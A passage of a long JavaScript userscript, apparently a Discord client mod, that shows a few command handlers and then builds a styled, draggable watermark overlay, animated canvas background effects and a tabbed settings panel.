        clearlog() { state.ghostPings.length = 0; return '\uD83D\uDDD1\uFE0F Ghost ping log cleared'; },
        statusrotate() {
            if (state.statusInterval) { stopStatusRotator(); return '\uD83D\uDD04 Status rotator **OFF**'; }
            StatusCfg.enabled = true; startStatusRotator();
            return '\uD83D\uDD04 Status rotator **ON**';
        },
        version() { return '\uD83D\uDE80 **' + SCRIPT_NAME + ' v' + VERSION + '** — Owner/Cohost Edition\nCommands: **' + Object.keys(REGULAR_COMMANDS).length + '** regular + **' + (Object.keys(COHOST_COMMANDS).length - Object.keys(REGULAR_COMMANDS).length) + '** cohost'; },
    });


    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 10: VIP WATERMARK SYSTEM
       ═══════════════════════════════════════════════════════════════════════ */

    function getWatermarkText() {
        let sub = WatermarkCfg.subtext;
        sub = sub.replace(/\{username\}/g, state.username || 'Unknown');
        sub = sub.replace(/\{userid\}/g, state.userId || '???');
        sub = sub.replace(/\{server\}/g, state.guildName || 'DM');
        sub = sub.replace(/\{serverid\}/g, state.guildId || '???');
        sub = sub.replace(/\{version\}/g, VERSION);
        sub = sub.replace(/\{time\}/g, $.fmtTime(Date.now()));
        sub = sub.replace(/\{date\}/g, new Date().toLocaleDateString());
        return { main: WatermarkCfg.text, sub };
    }

    function buildWatermark() {
        const existing = document.getElementById('cc-watermark');
        if (existing) existing.remove();

        if (!WatermarkCfg.enabled || WatermarkCfg.hidden) return;

        const font = WatermarkCfg.customFont || WatermarkCfg.fontFamily;
        const pos = WatermarkCfg.position.split('-');
        const vert = pos[0] || 'top';
        const horiz = pos[1] || 'right';

        // Color preset sync
        if (WatermarkCfg.colorPreset && COLOR_PRESETS[WatermarkCfg.colorPreset]) {
            WatermarkCfg.color = COLOR_PRESETS[WatermarkCfg.colorPreset];
        }
        if (WatermarkCfg.useGradient && GRADIENT_PRESETS[WatermarkCfg.gradientPreset]) {
            WatermarkCfg.gradient = GRADIENT_PRESETS[WatermarkCfg.gradientPreset];
        }

        const el = document.createElement('div');
        el.id = 'cc-watermark';

        const texts = getWatermarkText();
        const color = WatermarkCfg.useGradient ? 'transparent' : WatermarkCfg.color;
        const bgGradient = WatermarkCfg.useGradient ? 'background:' + WatermarkCfg.gradient + '; -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text;' : 'color:' + color + ';';

        // Badges display
        const badgeHtml = WatermarkCfg.showBadges
            ? '<div id="cc-wm-badges" style="margin-top:5px;display:flex;flex-wrap:wrap;gap:3px;max-width:220px;">' +
            getBadgeList().slice(0, 10).map(b =>
                '<span style="background:' + WatermarkCfg.color + '18;color:' + WatermarkCfg.color + ';padding:2px 6px;border-radius:5px;font-size:7.5px;text-transform:uppercase;letter-spacing:0.8px;border:1px solid ' + WatermarkCfg.color + '33;font-weight:600;">' + b + '</span>'
            ).join('') + '</div>'
            : '';

        // Clock display
        const clockHtml = WatermarkCfg.showClock
            ? '<div id="cc-wm-clock" style="font-size:10px;color:' + WatermarkCfg.color + '88;font-family:' + font + ',monospace;margin-top:3px;letter-spacing:1px;">' + $.fmtTime(Date.now()) + '</div>'
            : '';

        // Stats display
        const statsHtml = WatermarkCfg.showStats && !WatermarkCfg.compact
            ? '<div id="cc-wm-stats" style="font-size:8px;color:#666;margin-top:4px;display:flex;gap:8px;"><span>Msgs: ' + state.stats.messagesSent + '</span><span>Cmds: ' + state.stats.commandsUsed + '</span></div>'
            : '';

        // Network indicator
        const netHtml = WatermarkCfg.showNetwork && !WatermarkCfg.compact
            ? '<div id="cc-wm-net" style="font-size:8px;color:' + WatermarkCfg.color + '66;margin-top:2px;">\uD83D\uDD0C Connected</div>'
            : '';

        // Corner accent
        const cornerHtml = WatermarkCfg.cornerAccent
            ? '<div style="position:absolute;top:0;right:0;width:20px;height:20px;overflow:hidden;"><div style="position:absolute;top:-10px;right:-10px;width:20px;height:20px;background:' + WatermarkCfg.color + ';transform:rotate(45deg);opacity:0.4;"></div></div>'
            : '';

        // Scanline overlay
        const scanlineHtml = WatermarkCfg.scanline
            ? '<div style="position:absolute;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);pointer-events:none;border-radius:' + WatermarkCfg.borderRadius + 'px;"></div>'
            : '';

        const mainHtml = WatermarkCfg.compact
            ? '<div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">' +
            '<span style="' + bgGradient + 'font-weight:800;font-size:' + WatermarkCfg.fontSize + 'px;letter-spacing:0.5px;">' + $.escapeHtml(texts.main) + '</span>' +
            '<span style="color:#888;font-size:' + (WatermarkCfg.fontSize - 3) + 'px;">' + $.escapeHtml(texts.sub) + '</span>' +
            '</div>'
            : '<div style="font-weight:800;font-size:' + WatermarkCfg.fontSize + 'px;letter-spacing:0.5px;' + bgGradient + '">' + $.escapeHtml(texts.main) + '</div>' +
            '<div style="font-size:' + (WatermarkCfg.fontSize - 2) + 'px;color:#949ba4;margin-top:3px;letter-spacing:0.3px;">' + $.escapeHtml(texts.sub) + '</div>';

        const content = state.miniMode
            ? '<div style="font-weight:800;font-size:' + (WatermarkCfg.fontSize + 2) + 'px;' + bgGradient + '">' + $.escapeHtml(texts.main.charAt(0)) + '</div>'
            : mainHtml + clockHtml + badgeHtml + statsHtml + netHtml;

        el.innerHTML = cornerHtml + content + scanlineHtml;

        // iOS-specific fixed positioning fix
        const iosFix = $.isIOS() ? '-webkit-transform:translateZ(0);transform:translateZ(0);' : '';

        el.style.cssText =
            'position:fixed;' + vert + ':14px;' + horiz + ':14px;' +
            'background:' + WatermarkCfg.bgColor + ';' +
            'border:1px solid ' + WatermarkCfg.borderColor + ';' +
            'border-radius:' + WatermarkCfg.borderRadius + 'px;' +
            'padding:' + (state.miniMode ? '8px 12px' : WatermarkCfg.padding) + ';' +
            'font-family:"' + font + '",monospace;' +
            'z-index:2147483647;' +
            'opacity:' + WatermarkCfg.opacity + ';' +
            'backdrop-filter:blur(' + WatermarkCfg.blur + 'px);' +
            '-webkit-backdrop-filter:blur(' + WatermarkCfg.blur + 'px);' +
            'transition:all 0.35s cubic-bezier(0.4,0,0.2,1);' +
            'cursor:' + (WatermarkCfg.draggable ? 'grab' : 'pointer') + ';' +
            'user-select:none;max-width:280px;overflow:hidden;' +
            'touch-action:manipulation;-webkit-touch-callout:none;' +
            '-webkit-user-select:none;' + iosFix +
            (WatermarkCfg.neonBorder ? 'box-shadow:0 0 ' + WatermarkCfg.glowIntensity + 'px ' + WatermarkCfg.glowColor + ', inset 0 0 ' + (WatermarkCfg.glowIntensity / 2) + 'px ' + WatermarkCfg.glowColor + '33;' : 'box-shadow:0 4px 24px ' + WatermarkCfg.glowColor + ';');

        // Slide-in animation
        if (EffectsCfg.watermark.slideIn) {
            el.style.transform = horiz === 'right' ? 'translateX(130%)' : 'translateX(-130%)';
            el.style.opacity = '0';
            requestAnimationFrame(() => {
                requestAnimationFrame(() => {
                    el.style.transform = 'translateX(0)';
                    el.style.opacity = '' + WatermarkCfg.opacity;
                });
            });
        }

        // Pulse glow
        if (EffectsCfg.watermark.pulse) {
            const style = document.createElement('style');
            style.id = 'cc-wm-pulse';
            style.textContent = '@keyframes ccPulse{0%,100%{box-shadow:0 0 ' + (WatermarkCfg.glowIntensity * 0.7) + 'px ' + WatermarkCfg.glowColor + ';}50%{box-shadow:0 0 ' + (WatermarkCfg.glowIntensity * 1.5) + 'px ' + WatermarkCfg.color + '88,0 0 ' + (WatermarkCfg.glowIntensity * 2) + 'px ' + WatermarkCfg.glowColor + ';}}';
            if (!document.getElementById('cc-wm-pulse')) document.head.appendChild(style);
            el.style.animation = 'ccPulse ' + EffectsCfg.watermark.pulseSpeed + 's ease-in-out infinite';
        }

        // Rainbow mode
        if (EffectsCfg.watermark.rainbow) {
            const style = document.createElement('style');
            style.id = 'cc-wm-rainbow';
            style.textContent = '@keyframes ccRainbow{0%{filter:hue-rotate(0deg);}100%{filter:hue-rotate(360deg);}}';
            if (!document.getElementById('cc-wm-rainbow')) document.head.appendChild(style);
            el.style.animation = (el.style.animation || '') + ' ccRainbow 5s linear infinite';
        }

        // Breathe
        if (EffectsCfg.watermark.breathe) {
            const style = document.createElement('style');
            style.id = 'cc-wm-breathe';
            style.textContent = '@keyframes ccBreathe{0%,100%{transform:scale(1);}50%{transform:scale(1.03);}}';
            if (!document.getElementById('cc-wm-breathe')) document.head.appendChild(style);
            el.style.animation = (el.style.animation || '') + ' ccBreathe 4s ease-in-out infinite';
        }

        // Glitch effect
        if (EffectsCfg.watermark.glitch) {
            const style = document.createElement('style');
            style.id = 'cc-wm-glitch';
            style.textContent = '@keyframes ccGlitch{0%,90%,100%{transform:translate(0);}92%{transform:translate(-2px,1px);}94%{transform:translate(2px,-1px);}96%{transform:translate(-1px,2px);}}';
            if (!document.getElementById('cc-wm-glitch')) document.head.appendChild(style);
            el.style.animation = (el.style.animation || '') + ' ccGlitch 5s ease-in-out infinite';
        }

        // Float
        if (EffectsCfg.watermark.float) {
            const style = document.createElement('style');
            style.id = 'cc-wm-float';
            style.textContent = '@keyframes ccFloat{0%,100%{transform:translateY(0);}50%{transform:translateY(-4px);}}';
            if (!document.getElementById('cc-wm-float')) document.head.appendChild(style);
            if (!EffectsCfg.watermark.slideIn) {
                el.style.animation = (el.style.animation || '') + ' ccFloat 3s ease-in-out infinite';
            }
        }

        // Text shadow
        if (WatermarkCfg.textShadow) {
            el.querySelector('div > div:first-child, div > span:first-child').style.textShadow = '0 0 10px ' + WatermarkCfg.glowColor;
        }

        // Hover effects
        el.addEventListener('mouseenter', () => { if (!state.dragState.active) { el.style.transform = 'scale(1.03)'; el.style.borderColor = WatermarkCfg.color; } }, { passive: true });
        el.addEventListener('mouseleave', () => { if (!state.dragState.active) { el.style.transform = 'scale(1)'; el.style.borderColor = WatermarkCfg.borderColor; } }, { passive: true });
        el.addEventListener('click', (e) => { if (!state.dragState.active) openSettingsPanel(); }, { passive: true });

        // Double-click for mini mode
        let lastClick = 0;
        el.addEventListener('click', (e) => {
            const now = Date.now();
            if (now - lastClick < 300) {
                state.miniMode = !state.miniMode;
                buildWatermark();
                showToast(state.miniMode ? 'Mini mode ON' : 'Mini mode OFF', 'info');
            }
            lastClick = now;
        }, { passive: true });

        // Drag support
        if (WatermarkCfg.draggable) { initDrag(el); }

        document.body.appendChild(el);

        // Live clock update
        if (WatermarkCfg.showClock && !state.miniMode) {
            const clockEl = document.getElementById('cc-wm-clock');
            if (clockEl) {
                const updateClock = () => { clockEl.textContent = $.fmtTime(Date.now()); };
                state.clockInterval = setInterval(updateClock, 1000);
            }
        }
    }

    function initDrag(el) {
        el.addEventListener('mousedown', (e) => {
            if (e.button !== 0) return;
            state.dragState.active = true;
            state.dragState.offsetX = e.clientX - el.offsetLeft;
            state.dragState.offsetY = e.clientY - el.offsetTop;
            el.style.cursor = 'grabbing';

            const onMove = (ev) => {
                el.style.left = (ev.clientX - state.dragState.offsetX) + 'px';
                el.style.top = (ev.clientY - state.dragState.offsetY) + 'px';
                el.style.right = 'auto';
                el.style.bottom = 'auto';
            };

            const onUp = () => {
                state.dragState.active = false;
                el.style.cursor = 'grab';
                document.removeEventListener('mousemove', onMove);
                document.removeEventListener('mouseup', onUp);
            };

            document.addEventListener('mousemove', onMove);
            document.addEventListener('mouseup', onUp);
        }, { passive: true });
    }

    function updateWatermark() {
        if (state.clockInterval) { clearInterval(state.clockInterval); state.clockInterval = null; }
        buildWatermark();
        Settings.save('watermark', WatermarkCfg);
    }


    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 11: CYBERPUNK BACKGROUND EFFECTS ENGINE
       ═══════════════════════════════════════════════════════════════════════ */

    function injectFonts() {
        if (!EffectsCfg.ui.fontInject) return;
        const fonts = [
            'https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap',
            'https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap',
            'https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap',
            'https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap',
            'https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&display=swap',
        ];
        fonts.forEach(href => {
            if (!document.querySelector(`link[href="${href}"]`)) {
                const link = document.createElement('link');
                link.rel = 'stylesheet'; link.href = href;
                document.head.appendChild(link);
            }
        });
    }

    function createEffectsContainer() {
        if (state.effectsInjected) return;
        state.effectsInjected = true;
        const container = document.createElement('div');
        container.id = 'cc-fx-container';
        container.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;overflow:hidden;';
        document.body.insertBefore(container, document.body.firstChild);
        applyBackgroundEffect();
    }

    function applyBackgroundEffect() {
        const container = document.getElementById('cc-fx-container');
        if (!container) return;
        container.innerHTML = '';
        const fx = EffectsCfg.background;
        if (!fx.enabled) return;

        const canvas = document.createElement('canvas');
        canvas.id = 'cc-fx-canvas';
        canvas.style.cssText = `position:absolute;top:0;left:0;width:100%;height:100%;opacity:${fx.opacity};mix-blend-mode:${fx.blendMode};`;
        container.appendChild(canvas);
        const ctx = canvas.getContext('2d');
        let animId = null;

        function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
        resize(); window.addEventListener('resize', resize, { passive: true });

        const c1 = fx.color, c2 = fx.color2, c3 = fx.color3;
        const intensity = fx.intensity;
        const speed = fx.speed;

        if (fx.type === 'particles') {
            const particles = Array.from({ length: intensity }, () => ({
                x: Math.random() * canvas.width, y: Math.random() * canvas.height,
                vx: $.randFloat(-0.5, 0.5) * speed, vy: $.randFloat(-0.5, 0.5) * speed,
                r: $.randFloat(1, fx.size || 3), alpha: $.randFloat(0.1, 0.6),
                color: Math.random() > 0.5 ? c1 : c2
            }));
            function draw() {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                particles.forEach(p => {
                    p.x += p.vx; p.y += p.vy;
                    if (p.x < -10) p.x = canvas.width + 10; if (p.x > canvas.width + 10) p.x = -10;
                    if (p.y < -10) p.y = canvas.height + 10; if (p.y > canvas.height + 10) p.y = -10;
                    ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
                    ctx.fillStyle = p.color; ctx.globalAlpha = p.alpha; ctx.fill();
                });
                // Draw connections
                ctx.globalAlpha = 0.05;
                ctx.strokeStyle = c1;
                ctx.lineWidth = 0.5;
                for (let i = 0; i < particles.length; i++) {
                    for (let j = i + 1; j < particles.length; j++) {
                        const d = $.dist(particles[i].x, particles[i].y, particles[j].x, particles[j].y);
                        if (d < 100) { ctx.beginPath(); ctx.moveTo(particles[i].x, particles[i].y); ctx.lineTo(particles[j].x, particles[j].y); ctx.stroke(); }
                    }
                }
                ctx.globalAlpha = 1; animId = requestAnimationFrame(draw);
            }
            draw();
        } else if (fx.type === 'matrix') {
            const fontSize = 14;
            const cols = Math.floor(canvas.width / fontSize);
            const drops = Array(cols).fill(0);
            function draw() {
                ctx.fillStyle = 'rgba(0,0,0,0.04)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
                for (let i = 0; i < drops.length; i++) {
                    const char = String.fromCharCode(0x30A0 + Math.random() * 96);
                    const y = drops[i] * fontSize;
                    ctx.font = fontSize + 'px monospace';
                    ctx.fillStyle = Math.random() > 0.98 ? '#fff' : c1;
                    ctx.fillText(char, i * fontSize, y);
                    if (y > canvas.height && Math.random() > 0.975) drops[i] = 0;
                    drops[i] += speed;
                }
                animId = requestAnimationFrame(draw);
            }
            draw();
        } else if (fx.type === 'snow') {
            const flakes = Array.from({ length: intensity }, () => ({
                x: Math.random() * canvas.width, y: Math.random() * canvas.height,
                r: $.randFloat(1, 4), speed: $.randFloat(0.3, 1.5) * speed, wind: $.randFloat(-0.3, 0.3),
                alpha: $.randFloat(0.3, 0.8)
            }));
            function draw() {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                flakes.forEach(f => {
                    f.y += f.speed; f.x += f.wind + Math.sin(f.y * 0.01) * 0.3;
                    if (f.y > canvas.height + 5) { f.y = -5; f.x = Math.random() * canvas.width; }
                    if (f.x < -5) f.x = canvas.width + 5; if (f.x > canvas.width + 5) f.x = -5;
                    ctx.beginPath(); ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2);
                    ctx.fillStyle = c1; ctx.globalAlpha = f.alpha; ctx.fill();
                });
                ctx.globalAlpha = 1; animId = requestAnimationFrame(draw);
            }
            draw();
        } else if (fx.type === 'rain') {
            const drops = Array.from({ length: intensity }, () => ({
                x: Math.random() * canvas.width, y: Math.random() * canvas.height,
                length: $.randFloat(10, 25), speed: $.randFloat(4, 8) * speed, alpha: $.randFloat(0.1, 0.4)
            }));
            function draw() {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                drops.forEach(d => {
                    d.y += d.speed;
                    if (d.y > canvas.height) { d.y = -d.length; d.x = Math.random() * canvas.width; }
                    ctx.beginPath(); ctx.moveTo(d.x, d.y); ctx.lineTo(d.x, d.y + d.length);
                    ctx.strokeStyle = c1; ctx.globalAlpha = d.alpha; ctx.lineWidth = 1; ctx.stroke();
                });
                ctx.globalAlpha = 1; animId = requestAnimationFrame(draw);
            }
            draw();
        } else if (fx.type === 'gradient-mesh') {
            let t = 0;
            function draw() {
                t += 0.003 * speed;
                const g = ctx.createRadialGradient(
                    canvas.width * (0.5 + Math.sin(t) * 0.3), canvas.height * (0.5 + Math.cos(t * 0.7) * 0.3), 0,
                    canvas.width * 0.5, canvas.height * 0.5, canvas.width * 0.8
                );
                g.addColorStop(0, c1); g.addColorStop(0.5, c2); g.addColorStop(1, 'transparent');
                ctx.fillStyle = g; ctx.fillRect(0, 0, canvas.width, canvas.height);
                animId = requestAnimationFrame(draw);
            }
            draw();
        } else if (fx.type === 'plasma') {
            let t = 0;
            function draw() {
                t += 0.01 * speed;
                const imageData = ctx.createImageData(canvas.width, canvas.height);
                const data = imageData.data;
                for (let y = 0; y < canvas.height; y += 2) {
                    for (let x = 0; x < canvas.width; x += 2) {
                        const v = Math.sin(x * 0.02 + t) + Math.sin(y * 0.02 + t) + Math.sin((x + y) * 0.01 + t * 2);
                        const idx = (y * canvas.width + x) * 4;
                        const r = Math.floor(128 + 127 * Math.sin(v * Math.PI + 0));
                        const g = Math.floor(128 + 127 * Math.sin(v * Math.PI + 2));
                        const b = Math.floor(128 + 127 * Math.sin(v * Math.PI + 4));
                        data[idx] = r; data[idx + 1] = g; data[idx + 2] = b; data[idx + 3] = 30;
                        data[idx + 4] = r; data[idx + 5] = g; data[idx + 6] = b; data[idx + 7] = 30;
                    }
                }
                ctx.putImageData(imageData, 0, 0);
                animId = requestAnimationFrame(draw);
            }
            draw();
        } else if (fx.type === 'bokeh') {
            const circles = Array.from({ length: intensity }, () => ({
                x: Math.random() * canvas.width, y: Math.random() * canvas.height,
                r: $.randFloat(20, 80), vx: $.randFloat(-0.2, 0.2) * speed, vy: $.randFloat(-0.2, 0.2) * speed,
                color: Math.random() > 0.5 ? c1 : c2, alpha: $.randFloat(0.03, 0.12)
            }));
            function draw() {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                circles.forEach(c => {
                    c.x += c.vx; c.y += c.vy;
                    if (c.x < -100) c.x = canvas.width + 100; if (c.x > canvas.width + 100) c.x = -100;
                    if (c.y < -100) c.y = canvas.height + 100; if (c.y > canvas.height + 100) c.y = -100;
                    ctx.beginPath(); ctx.arc(c.x, c.y, c.r, 0, Math.PI * 2);
                    ctx.fillStyle = c.color; ctx.globalAlpha = c.alpha; ctx.fill();
                });
                ctx.globalAlpha = 1; animId = requestAnimationFrame(draw);
            }
            draw();
        } else if (fx.type === 'stars') {
            const stars = Array.from({ length: intensity }, () => ({
                x: Math.random() * canvas.width, y: Math.random() * canvas.height,
                r: $.randFloat(0.5, 2), twinkleSpeed: $.randFloat(0.02, 0.08), phase: Math.random() * Math.PI * 2
            }));
            let t = 0;
            function draw() {
                t += 0.016;
                ctx.fillStyle = '#000'; ctx.fillRect(0, 0, canvas.width, canvas.height);
                stars.forEach(s => {
                    const alpha = 0.3 + 0.7 * Math.abs(Math.sin(t * s.twinkleSpeed + s.phase));
                    ctx.beginPath(); ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
                    ctx.fillStyle = c1; ctx.globalAlpha = alpha; ctx.fill();
                });
                // Shooting star
                if (Math.random() > 0.995) {
                    const sx = Math.random() * canvas.width, sy = Math.random() * canvas.height * 0.5;
                    ctx.beginPath(); ctx.moveTo(sx, sy); ctx.lineTo(sx - 60, sy + 20);
                    ctx.strokeStyle = '#fff'; ctx.globalAlpha = 0.6; ctx.lineWidth = 1; ctx.stroke();
                }
                ctx.globalAlpha = 1; animId = requestAnimationFrame(draw);
            }
            draw();
        } else if (fx.type === 'cyber-grid') {
            let t = 0;
            function draw() {
                t += 0.005 * speed;
                ctx.fillStyle = 'rgba(0,0,0,0.1)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
                ctx.strokeStyle = c1; ctx.globalAlpha = 0.15; ctx.lineWidth = 0.5;
                const gridSize = 40;
                for (let x = 0; x < canvas.width; x += gridSize) {
                    ctx.beginPath(); ctx.moveTo(x + Math.sin(t + x * 0.01) * 5, 0); ctx.lineTo(x, canvas.height); ctx.stroke();
                }
                for (let y = 0; y < canvas.height; y += gridSize) {
                    ctx.beginPath(); ctx.moveTo(0, y + Math.cos(t + y * 0.01) * 5); ctx.lineTo(canvas.width, y); ctx.stroke();
                }
                ctx.globalAlpha = 1; animId = requestAnimationFrame(draw);
            }
            draw();
        }

        window.__cc_fx_cleanup = () => { if (animId) cancelAnimationFrame(animId); };
    }


    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 12: REDESIGNED SETTINGS PANEL
       ═══════════════════════════════════════════════════════════════════════ */

    function openSettingsPanel() {
        const existing = document.getElementById('cc-settings-panel');
        if (existing) { existing.remove(); return; }

        const panel = document.createElement('div');
        panel.id = 'cc-settings-panel';
        panel.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.75);z-index:2147483646;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(6px);font-family:"Inter",system-ui,sans-serif;overflow-y:auto;touch-action:manipulation;-webkit-overflow-scrolling:touch;animation:ccFadeIn 0.2s ease;';

        const style = document.createElement('style');
        style.textContent = `
            @keyframes ccFadeIn{from{opacity:0}to{opacity:1}}
            @keyframes ccSlideUp{from{opacity:0;transform:translateY(24px) scale(0.97)}to{opacity:1;transform:translateY(0) scale(1)}}
            .cc-tab{display:flex;gap:2px;border-bottom:1px solid #333;margin-bottom:16px;flex-wrap:wrap;padding-bottom:4px}
            .cc-tab-btn{background:none;border:none;color:#888;padding:8px 16px;cursor:pointer;font-size:12px;font-weight:600;transition:all 0.2s;border-radius:8px 8px 0 0;border-bottom:2px solid transparent}
            .cc-tab-btn:hover{color:#ccc;background:#ffffff08}
            .cc-tab-btn.active{color:${WatermarkCfg.color};border-bottom-color:${WatermarkCfg.color};background:#ffffff0a}
            .cc-section{display:none;animation:ccFadeIn 0.25s ease}
            .cc-section.active{display:block}
            .cc-row{display:flex;align-items:center;justify-content:space-between;padding:10px 0;border-bottom:1px solid #222;flex-wrap:wrap;gap:8px}
            .cc-label{color:#dbdee1;font-size:12px;font-weight:500}
            .cc-desc{color:#666;font-size:10px;margin-top:3px;line-height:1.4}
            .cc-input{background:#16171a;border:1px solid #2a2a2e;color:#dbdee1;padding:7px 12px;border-radius:8px;font-size:11px;min-width:160px;outline:none;transition:all 0.2s;font-family:inherit}
            .cc-input:focus{border-color:${WatermarkCfg.color};box-shadow:0 0 0 2px ${WatermarkCfg.color}22}
            .cc-toggle{width:38px;height:22px;background:#333;border-radius:11px;cursor:pointer;position:relative;transition:background 0.25s;flex-shrink:0}
            .cc-toggle.on{background:${WatermarkCfg.color}}
            .cc-toggle::after{content:'';position:absolute;top:2px;left:2px;width:18px;height:18px;background:#fff;border-radius:50%;transition:transform 0.25s;box-shadow:0 1px 3px rgba(0,0,0,0.3)}
            .cc-toggle.on::after{transform:translateX(16px)}
            .cc-select{background:#16171a;border:1px solid #2a2a2e;color:#dbdee1;padding:7px 12px;border-radius:8px;font-size:11px;outline:none;cursor:pointer;font-family:inherit;min-width:140px}
            .cc-select:focus{border-color:${WatermarkCfg.color}}
            .cc-btn{background:${WatermarkCfg.color};color:#fff;border:none;padding:9px 18px;border-radius:8px;cursor:pointer;font-size:11px;font-weight:600;transition:all 0.2s;font-family:inherit;letter-spacing:0.3px}
            .cc-btn:hover{opacity:0.88;transform:translateY(-1px);box-shadow:0 4px 12px ${WatermarkCfg.color}44}
            .cc-btn:active{transform:translateY(0)}
            .cc-btn.secondary{background:#2a2a2e;color:#dbdee1}
            .cc-btn.secondary:hover{background:#333}
            .cc-btn.danger{background:#ed4245}
            .cc-btn.danger:hover{background:#ff5558}
            .cc-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
            .cc-color{width:32px;height:32px;border-radius:8px;border:2px solid #444;cursor:pointer;padding:0;overflow:hidden;flex-shrink:0;transition:transform 0.2s}
            .cc-color:hover{transform:scale(1.1)}
            .cc-color input[type="color"]{width:40px;height:40px;border:none;cursor:pointer;padding:0;margin:-4px 0 0 -4px}
            .cc-preset-grid{display:grid;grid-template-columns:repeat(8,1fr);gap:5px;margin:10px 0}
            .cc-preset{width:28px;height:28px;border-radius:8px;border:2px solid transparent;cursor:pointer;transition:all 0.2s}
            .cc-preset:hover{transform:scale(1.15);border-color:#888}
            .cc-preset.active{border-color:#fff;box-shadow:0 0 0 2px ${WatermarkCfg.color}}
            .cc-info-box{background:#16171a;border:1px solid #2a2a2e;border-radius:8px;padding:10px 14px;font-size:11px;color:#888;line-height:1.6}
            .cc-info-box strong{color:${WatermarkCfg.color}}
            .cc-slider{-webkit-appearance:none;width:120px;height:4px;border-radius:2px;background:#333;outline:none}
            .cc-slider::-webkit-slider-thumb{-webkit-appearance:none;width:14px;height:14px;border-radius:50%;background:${WatermarkCfg.color};cursor:pointer}
            .cc-slider::-moz-range-thumb{width:14px;height:14px;border-radius:50%;background:${WatermarkCfg.color};cursor:pointer;border:none}
        `;
        document.head.appendChild(style);

        panel.innerHTML = buildSettingsHTML();
        document.body.appendChild(panel);

        panel.querySelectorAll('.cc-tab-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                panel.querySelectorAll('.cc-tab-btn').forEach(b => b.classList.remove('active'));
                panel.querySelectorAll('.cc-section').forEach(s => s.classList.remove('active'));
                btn.classList.add('active');
                panel.querySelector('#cc-' + btn.dataset.tab).classList.add('active');
            });
        });

        panel.addEventListener('click', e => { if (e.target === panel) panel.remove(); });
        bindSettingsHandlers(panel);
    }

    function buildSettingsHTML() {
        const tabs = [
            { id: 'watermark', label: 'Watermark', icon: '\uD83D\uDC64' },
            { id: 'effects', label: 'FX Engine', icon: '\uD83C\uDFA8' },
            { id: 'badges', label: 'Badges', icon: '\uD83C\uDFC5' },
            { id: 'commands', label: 'Commands', icon: '\uD83D\uDCDC' },
            { id: 'advanced', label: 'Advanced', icon: '\u2699\uFE0F' },
            { id: 'data', label: 'Data', icon: '\uD83D\uDCBE' },
            { id: 'about', label: 'About', icon: '\uD83D\uDE80' },
        ];

        return '<div style="background:#1a1b1e;border-radius:20px;width:560px;max-height:85vh;overflow-y:auto;padding:28px;box-shadow:0 32px 96px rgba(0,0,0,0.7),0 0 0 1px #333;animation:ccSlideUp 0.3s ease;border:1px solid #2a2a2e;">' +
            '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">' +
            '<div style="display:flex;align-items:center;gap:10px;">' +
            '<div style="width:42px;height:42px;border-radius:12px;background:' + (WatermarkCfg.useGradient ? WatermarkCfg.gradient : WatermarkCfg.color) + ';display:flex;align-items:center;justify-content:center;font-size:18px;color:#fff;font-weight:800;">' + WatermarkCfg.text.charAt(0) + '</div>' +
            '<div><div style="font-size:17px;font-weight:700;color:#fff;">' + SCRIPT_NAME + '</div><div style="font-size:10px;color:#888;margin-top:2px;">v' + VERSION + ' \u2022 Click watermark anytime</div></div></div>' +
            '<button id="cc-panel-close" style="background:#2a2a2e;border:none;color:#888;cursor:pointer;font-size:20px;padding:6px 12px;border-radius:8px;transition:all 0.2s;font-weight:600;">&times;</button></div>' +
            '<div class="cc-tab">' + tabs.map((t, i) => '<button class="cc-tab-btn ' + (i === 0 ? 'active' : '') + '" data-tab="' + t.id + '">' + t.icon + ' ' + t.label + '</button>').join('') + '</div>' +
            buildWatermarkSection() + buildEffectsSection() + buildBadgesSection() +
            buildCommandsSection() + buildAdvancedSection() + buildDataSection() + buildAboutSection() +
            '</div>';
    }

    function buildWatermarkSection() {
        const positions = ['top-left', 'top-right', 'bottom-left', 'bottom-right'];
        const fonts = ['JetBrains Mono', 'Inter', 'Poppins', 'Orbitron', 'Rajdhani', 'Fira Code', 'Roboto Mono'];
        const animations = [{ id: 'pulse', label: 'Pulse' }, { id: 'rainbow', label: 'Rainbow' }, { id: 'breathe', label: 'Breathe' }, { id: 'glitch', label: 'Glitch' }, { id: 'float', label: 'Float' }, { id: 'none', label: 'None' }];

        let presetHtml = '<div style="margin-bottom:4px;font-size:11px;color:#888;font-weight:600;">Color Presets</div><div class="cc-preset-grid">';
        Object.entries(COLOR_PRESETS).forEach(([name, color]) => {
            presetHtml += '<div class="cc-preset ' + (WatermarkCfg.colorPreset === name ? 'active' : '') + '" data-preset="' + name + '" style="background:' + color + '" title="' + name + '"></div>';
        });
        presetHtml += '</div>';

        let gradHtml = '<div style="margin:12px 0 4px;font-size:11px;color:#888;font-weight:600;">Gradient Presets</div><div class="cc-preset-grid" style="grid-template-columns:repeat(5,1fr);">';
        Object.entries(GRADIENT_PRESETS).forEach(([name, grad]) => {
